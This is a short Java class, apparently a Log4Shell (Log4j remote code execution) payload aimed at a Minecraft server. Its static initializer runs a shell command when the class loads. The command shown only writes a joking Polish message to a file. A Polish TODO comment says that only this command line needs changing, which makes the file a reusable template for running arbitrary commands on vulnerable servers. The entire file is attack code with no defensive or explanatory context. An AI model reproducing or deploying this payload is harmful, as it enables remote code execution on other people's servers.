public class Log4jRCE {
    static {
                try {
                    Runtime r = Runtime.getRuntime();

                    // TODO - tylko poniższą linijkę trzeba zmienić
                    String[] cmd = {"bash", "-c", "echo 'czesc, tu kacper :DD' > pliczek_na_serverze_mc.txt"};

                    Process p = r.exec(cmd);
                    p.waitFor();
                } catch (Exception e) {
                    e.printStackTrace();
                }
    }
}